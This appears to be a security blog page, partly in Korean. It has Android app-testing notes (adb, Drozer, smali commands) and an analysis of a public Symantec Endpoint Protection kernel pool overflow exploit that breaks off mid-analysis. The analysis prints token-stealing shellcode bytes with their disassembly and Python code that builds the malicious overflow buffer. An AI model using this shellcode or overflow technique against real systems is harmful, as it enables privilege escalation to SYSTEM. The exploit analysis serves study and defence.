</span><span class='line'>drwxr-x--x u0_a46   u0_a46      2014-04-10 10:41 com.amazingutils.batterysaver
</span><span class='line'>
</span><span class='line'>class Test
</span><span class='line'>{
</span><span class='line'>    public static void main(String[] args)
</span><span class='line'>    {
</span><span class='line'>        System.out.println("It works! :D");
</span><span class='line'>    }
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$ javac Test.java
</span><span class='line'>$ dx -dex -output=test.jar Test.class
</span><span class='line'>
</span><span class='line'>$ adb push test.jar /data/local/tmp
</span><span class='line'>$ adb shell dalvikvm -cp /data/local/tmp/test.jar Test
</span><span class='line'>It works :D</span></code></pre></td></tr></table></div></figure>


<h4>Android Packages</h4>

<p>Android applications are distributed in the form of a zipped archive with the file
extension of .apk, which stands for Android Package. The official MIME-type of an
Android Package is application/vnd.android.package-archive. These packages
are nothing more than zip files containing the relevant compiled application code,
resources, and application metadata required to define a complete application.
According to Google&rsquo;s documentation at <a href="http://developer.android.com/tools/building/index.html,">http://developer.android.com/tools/building/index.html,</a>
an APK is packaged by performing the following taks:</p>

<ul>
<li>An SDK tool named aapt (Android Asset Packaging Tool) converts all the XML resource files included
in the application to a binary form. R.java is also produced by aapt to allow referencing of
resources from code.</li>
<li>A tool named aidl is used to convert any .aidl files to .java files containing a converted
representation of it using a standard Java interface.</li>
<li>All source code and converted output from aapt and aidl are compiled into .class files by
the Java 1.6 compiler. This requires the android.jar file for your desired API version to be
in the CLASSPATH environment variable.</li>
<li>The dx utility is used to convert the produced .class files and any third-party libraries into a single
classes.dex file.</li>
<li>All compiled resources, non-compiled resouces (such as images or additional executables), and
the application DEX file are used by the apkbuilder tool to package an APK file. More recent version of the
SDK have deprecated the standalone apkbuilder tool and included it as a class inside sdklib.jar.
The APK file is signed with a key using the jarsigner utility. It can either be signed by a default debug
key or if it is going to production, it can be signed with your generated release key.</li>
<li>If it is signed with a release key, the APK must be zip-aligned using the zipalign tool, which
ensures that the application resources are aligned optimally for the way that they will be loaded into memory.
The benefit of this is that the amount of RAM consumed when running the application is reduced.</li>
</ul>


<h4>Tools</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install /path/to/yourapplication.apk
</span><span class='line'>$ adb shell pm
</span><span class='line'>$ python -m  SimpleHTTPServer
</span><span class='line'>
</span><span class='line'>$ adb devices
</span><span class='line'>$ adb shell
</span><span class='line'>$ adb shell &lt;command&gt;
</span><span class='line'>$ adb push /path/to/local/file /path/on/android/device
</span><span class='line'>$ adb pull /path/on/android/device /path/to/local/file
</span><span class='line'>$ adb forward tcp:&lt;local_port&gt; tcp:&lt;device_port&gt;
</span><span class='line'>$ adb logcat
</span><span class='line'>
</span><span class='line'>http://www.busybox.net/downloads/binaries/
</span><span class='line'>
</span><span class='line'>$ adb push busybox-armv71 /data/local/tmp
</span><span class='line'>shell@android:/ $ chmod 755 /data/local/tmp/busybox-armv71
</span><span class='line'>sheel@android:/ $ export PATH=$PATH:/data/loal/tmp
</span><span class='line'>
</span><span class='line'>shell@android:/ $ pm list packages
</span><span class='line'>shell@android:/ $ pm path &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ pm install /path/to/apk
</span><span class='line'>shell@android:/ $ pm uninstall &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ pm disable &lt;package_name&gt;
</span><span class='line'>shell@android:/ $ logcat
</span><span class='line'>shell@android:/ $ logcat -s tag
</span><span class='line'>
</span><span class='line'>shell@android:/ $ getprop
</span><span class='line'>shell@android:/ $ dumpsys
</span><span class='line'>shell@android:/ $ service list</span></code></pre></td></tr></table></div></figure>


<h4>Drozer</h4>

<p><a href="https://www.mwrinfosecurity.com/products/drozer/community-edition/">Drozer</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install agent.apk
</span><span class='line'>$ adb forward tcp:31415 tcp:31415
</span><span class='line'>$ drozer console connect
</span><span class='line'>
</span><span class='line'>dz&gt; list package
</span><span class='line'>dz&gt; module search -d</span></code></pre></td></tr></table></div></figure>


<p><a href="https://github.com/mwrlabs/drozer-modules/">Drozer modules</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>app.activity
</span><span class='line'>app.broadcast
</span><span class='line'>app.package
</span><span class='line'>app.provider
</span><span class='line'>app.service
</span><span class='line'>auxiliary
</span><span class='line'>exploit.pilfer
</span><span class='line'>exploit.root
</span><span class='line'>information
</span><span class='line'>scanner
</span><span class='line'>shell
</span><span class='line'>tools.file
</span><span class='line'>tools.setup</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; shell
</span><span class='line'>u0_a59@android:/data/data/com.mwr.dz $ id
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz -h
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz &gt; /path/to/output.txt</span></code></pre></td></tr></table></div></figure>


<h4>Retrieving APK Files</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm list packages | grep twitter
</span><span class='line'>package:com.twitter.android</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.list -f "Terminal Emulator"
</span><span class='line'>jackpal.androidterm (Terminal Emulator)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm path jackpal.androidterm
</span><span class='line'>package:/data/app/jackpal.androidterm-2.apk</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a jackpal.androidterm
</span><span class='line'>Package: jackpal.androidterm
</span><span class='line'>  Application Label: Terminal Emulator
</span><span class='line'>  Process Name: jackpal.androidterm
</span><span class='line'>  Version: 1.0.59
</span><span class='line'>  Data Directory: /data/data/jackpal.androidterm
</span><span class='line'>  APK Path: /data/app/jackpal.androidterm-2.apk
</span><span class='line'>  UID: 10215
</span><span class='line'>  GID: [3003, 1015, 1023, 1028]
</span><span class='line'>  Shared Libraries: null
</span><span class='line'>  Shared User ID: null
</span><span class='line'>  Uses Permissions:
</span><span class='line'>  - android.permission.INTERNET
</span><span class='line'>  ...</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="http://apkleecher.com">http://apkleecher.com</a></li>
<li><a href="http://apps.evozi.com/apk-downloader">http://apps.evozi.com/apk-downloader</a></li>
</ul>


<h4>Viewing Manifests</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ aapt dump xmltree /path/to/agent.apk AndroidManifest.xml
</span><span class='line'>
</span><span class='line'>$ aapt l -a /path/to/agent.apk
</span><span class='line'>
</span><span class='line'>$ unzip agent.apk
</span><span class='line'>
</span><span class='line'>$ java -jar AXMLPrinter2.jar AndroidManifest.xml
</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
</span><span class='line'>&lt;manifest
</span><span class='line'>    xmlns:android="http://schemas.android.com/apk/res/android"
</span><span class='line'>    android:versionCode="5"
</span><span class='line'>    android:versionName="2.3.4"
</span><span class='line'>    package="com.mwr.dz"&gt;
</span><span class='line'>    &lt;uses-sdk android:minSdkVersion="7" android:targetSdkVersion="18"&gt;
</span><span class='line'>    &lt;/uses-sdk&gt;
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.manifest com.mwr.dz
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Activity &amp; Contenet Provider</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --component com.android.browser com.android.browser.BrowserActivity
</span><span class='line'>
</span><span class='line'>dz&gt; run app.provider.query content://settings/system</span></code></pre></td></tr></table></div></figure>


<h4>Permissions</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a com.android.browser
</span><span class='line'>Package: com.android.browser
</span><span class='line'>Application Label: Browser
</span><span class='line'>Process Name: com.android.browser
</span><span class='line'>Version: 4.4.2-938007
</span><span class='line'>Data Directory: /data/data/com.android.browser
</span><span class='line'>APK Path: /system/app/Browser.apk
</span><span class='line'>UID: 10014
</span><span class='line'>GID: [3003, 1028, 1015]
</span><span class='line'>Shared Libraries: null
</span><span class='line'>Shared User ID: null
</span><span class='line'>Users Permissions:
</span><span class='line'>- android.permission.ACCESS_COARSE_LOCATION
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.package.list -p android.permission.READ_SMS
</span><span class='line'>com.android.phone (Phone)
</span><span class='line'>com.android.mms (Messaging)
</span><span class='line'>com.android.gallery (Camera)
</span><span class='line'>com.android.camera (Camera)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; run app.provider.info -p android.permission.READ_SMS
</span><span class='line'>Package: com.android.mms
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Protection Levels</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ drozer agent build --permission android.permission.INSTALL_PACKAGES
</span><span class='line'>Done: /tmp/tmp2RdLTd/agent.apk
</span><span class='line'>
</span><span class='line'>$ adb install /tmp/tmp/2RdLTd/agent.apk
</span><span class='line'>2312 KB/s (653054 bytes in 0.275s)
</span><span class='line'>     pkg: /data/local/tmp/agent.apk
</span><span class='line'>Success
</span><span class='line'>
</span><span class='line'>$ adb logcat
</span><span class='line'>...
</span><span class='line'>W/PackageManager(  373): Not granting permission
</span><span class='line'>android.permission.INSTALL_PACKAGES to package com.mwr.dz (protectionLevel=18 flags=0x83e46)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>dz&gt; permissions
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Code Signing</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>
</span><span class='line'>$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore application.apk alias_name
</span><span class='line'>
</span><span class='line'>$ openssl pkcs7 -inform DER -in CERT.RSA -text -print_certs
</span><span class='line'>
</span><span class='line'>$ keytool -printcert -file CERT.RSA</span></code></pre></td></tr></table></div></figure>


<h4>Dex Tools</h4>

<ul>
<li>smali/baksmali</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ java -jar baksmali.jar app.apk
</span><span class='line'>$ jav -jar smali.jar -o classes.dex out/
</span><span class='line'>
</span><span class='line'>$ java -jar baksmali.jar -a 19 -x Settings.odex -d framework
</span><span class='line'>$ java -jar smali.jar -a 19 -o Settings.dex out/</span></code></pre></td></tr></table></div></figure>


<ul>
<li>IDA</li>
<li>dex2jar</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ d2j-dex2jar.sh agent.apk -o agent.jar</span></code></pre></td></tr></table></div></figure>


<ul>
<li>JEB</li>
<li>apktool</li>
<li>jadx</li>
<li>jad</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/14/arp-cache-poisoning/">ARP Cache Poisoning</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-14T21:22:47+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:22 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/14/symantec-endpoint-protection-kernel-pool-overflow/">Symantec Endpoint Protection - Kernel Pool Overflow</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-14T21:21:58+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:21 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://www.exploit-db.com/exploits/34272/">Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow</a></p>

<p>참고할만한 문서들은</p>

<ul>
<li><a href="http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel">Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1</a></li>
<li><a href="https://www.youtube.com/watch?v=-smvfojecvs">Project Heapbleed, BalCCon2k14</a></li>
<li><a href="http://www.slideshare.net/scovetta/kernelpool">Modern Kernel Pool Exploitation: Attacks and Techniques</a></li>
<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
<li><a href="http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf">Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf">Access token stealing on Windows, Csaba Barta, 2009</a></li>
<li><a href="http://www.uninformed.org/?v=3&amp;a=4&amp;t=pdf">Kernel-mode Payloads on Windows, bugcheck and skape</a></li>
<li><a href="http://www.uninformed.org/?v=6&amp;a=2&amp;t=pdf">Exploiting 802.11 Wireless Driver Vulnerabilities on Windows</a></li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf">Remote Windows Kernel Exploitation: Step into the Ring 0</a></li>
<li><a href="http://securityvulns.ru/docs4946.html">Win32 Device Drivers Communication Vulnerabilities, Lord Yup</a></li>
<li><a href="http://www.suse.de/~krahmer/no-nx.pdf">x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique</a></li>
<li>infamous HalDispatchTable</li>
<li>j00ru&rsquo;s research</li>
<li><a href="http://www.alex-ionescu.com/?p=231">Alex&rsquo;s lonescu research</a></li>
<li>Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011</li>
<li>Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008</li>
<li>SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005</li>
<li><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">Windows 8 Heap Internals</a></li>
<li><a href="https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf">GDI Font Fuzzing in Windows Kernel for Fun</a></li>
<li><a href="http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf">Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel</a></li>
<li><a href="http://j00ru.vexillium.org/?p=290">GDT and LDT in Windows kernel vulnerability exploitation</a></li>
<li>SoBelt X'con 2005</li>
<li>Kostya Kortchinsky SyScan 2008</li>
<li>Tarjei Mandt BH DC 2011</li>
</ul>


<h4>Exploit Strategy</h4>

<p><a href="http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html">OkayToCloseProcedure callback kernel hook</a></p>

<ul>
<li>IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.</li>
<li>ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.</li>
<li>이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.</li>
<li>OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.</li>
<li>Shellcode 는 Type Index 를 repair 하고, <code>nt authority\SYSTEM</code> 을 훔친다.</li>
</ul>


<h4>Token Stealing Shellcode</h4>

<p>Exploit 에서 사용된 shellcode 는 token stealing shellcode.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tokenstealing = (
</span><span class='line'>"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
</span><span class='line'>"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
</span><span class='line'>"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
</span><span class='line'>"\x00"
</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>


<p>Disassemble 해봤다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>33c0                    xor eax,eax
</span><span class='line'>648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>8b4050                  mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>8bc8                    mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>2db8000000              sub eax,0xb8
</span><span class='line'>83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>75ec                    jne loc_0000000e
</span><span class='line'>8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>8991f8000000            mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>c21000                  ret 0x10</span></code></pre></td></tr></table></div></figure>


<p><code>EPROCESS</code> 구조체에서 <code>Token</code> 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
<code>SYSTEM</code> 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.</p>

<p>Target 이 IDLE 상태라면, <code>FS:[0x124]</code> 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.</p>

<h4>Hotpatching SYSFER.DLL</h4>

<ol>
<li>VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.</li>
<li>할당받은 메모리에 크기 <code>0x44c</code> 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.</li>
<li>SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다.</li>
<li>저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 <code>child_block</code> 과 <code>child_block_size</code> 의 주소를 찾아낸다.</li>
<li>2 번의 메모리 주소로 <code>child_block</code> 을 overwrite 한다. 이제 <code>child_block</code> 은 악의적인 데이터를 포인팅한다.</li>
<li><code>0x44c</code> 로 <code>child_block_size</code> 를 overwrite 한다.</li>
</ol>


<h4>Evil child_block</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>""" Allocate the source buffer in the parent process """
</span><span class='line'>v = kernel32.VirtualAllocEx(phandle, 
</span><span class='line'>        0x0, 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        MEM_RESERVE|MEM_COMMIT, 
</span><span class='line'>        PAGE_EXECUTE_READWRITE)
</span><span class='line'># 8654c580  040c0090 ef436f49 00000000 0000005c
</span><span class='line'># 8654c590  00000000 00000000 00000001 00000001
</span><span class='line'># 8654c5a0  00000000 0008000a
</span><span class='line'>quota   = "\x00\x00\x00\x00"   
</span><span class='line'>header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
</span><span class='line'>header += "\x00\x00\x00\x00"
</span><span class='line'># TypeIndex = "\x0a\x00\x08\x00"
</span><span class='line'>TypeIndex = "\x00\x00\x08\x00"
</span><span class='line'>offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
</span><span class='line'>overflow  = offset + quota + header + TypeIndex 
</span><span class='line'>csrc      = create_string_buffer(overflow, evil_child_block_size)
</span><span class='line'>wrote     = c_ulong(0)
</span><span class='line'>res = kernel32.WriteProcessMemory(phandle, v, 
</span><span class='line'>        addressof(csrc), 
</span><span class='line'>        evil_child_block_size, 
</span><span class='line'>        byref(wrote))</span></code></pre></td></tr></table></div></figure>


<p><code>IoCompletionReserve</code> 오브젝트를 overwrite 할 것인데, <code>TypeIndex</code> 가 원래는 <code>0x0A</code> 인데 <code>0x00</code> 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.</p>

<p>아래의 <code>TypeIndex</code> 를 0 으로 overwrite 한다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
</span><span class='line'>+0x000 PointerCount : Int4B
</span><span class='line'>+0x004 HandleCount : Int4B
</span><span class='line'>+0x004 NextToFree : Ptr32 Void
</span><span class='line'>+0x008 Lock : _EX_PUSH_LOCK
</span><span class='line'>+0x00c TypeIndex : UChar &lt;- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
</span><span class='line'>+0x00d TraceFlags : Uchar
</span><span class='line'>+0x00d DbgRefTrace : Pos 0, 1 Bit
</span><span class='line'>+0x00d DbgTracePermanent : Pos 1, 1 Bit
</span><span class='line'>+0x00e InfoMask : UChar
</span><span class='line'>+0x00f Flags : UChar
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p><code>ObTypeIndexTable</code> 을 보면,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dd nt!ObTypeIndexTable 
</span><span class='line'>81a3edc0 00000000 bad0b0b0 85543768 855436a0
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _OBJECT_TYPE 85543768
</span><span class='line'>+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
</span><span class='line'>...
</span><span class='line'>+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이제 TypeInfo 를 까보자.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
</span><span class='line'>+0x000 Length               : 0x50
